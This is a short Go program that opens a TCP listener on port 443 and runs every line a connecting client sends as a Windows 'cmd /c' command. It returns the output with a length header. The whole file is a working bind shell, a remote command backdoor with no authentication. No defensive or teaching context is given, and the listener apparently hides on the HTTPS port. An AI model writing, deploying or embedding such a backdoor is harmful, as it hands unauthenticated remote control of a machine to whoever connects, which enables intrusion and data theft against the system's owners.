package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"syscall"
)

func main() {
	listener, err := net.Listen("tcp", ":443")
	if err != nil {
		os.Exit(1)
	}

	go func() {
		connection, err := listener.Accept()
		if err != nil {
			return
		}

		handleConnection(connection)
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	<-sigChan
	_ = listener.Close()
}

func handleConnection(connection net.Conn) {
	defer func() { _ = connection.Close() }()
	reader := bufio.NewReader(connection)

	for {
		// get input from client
		input, err := reader.ReadString('\n')
		if err != nil {
			_, err = fmt.Fprintf(connection, "Error reading input: %v\n", err)
			if err != nil {
				break
			}
			continue
		}

		// execute command
		cmd := exec.Command("cmd", "/c", input)
		output, err := cmd.CombinedOutput()
		if err != nil {
			_, err = fmt.Fprintf(connection, "Error executing command: %v\n", err)
			if err != nil {
				break
			}
			continue
		}

		// header including output length. sent first to the client so it knows how much to expect
		header := fmt.Sprintf("Content-Length: %d\n", len(output))
		_, err = fmt.Fprintf(connection, header)
		if err != nil {
			break
		}

		// send output to client
		_, err = fmt.Fprintf(connection, "%s", string(output))
		if err != nil {
			break
		}
	}
}
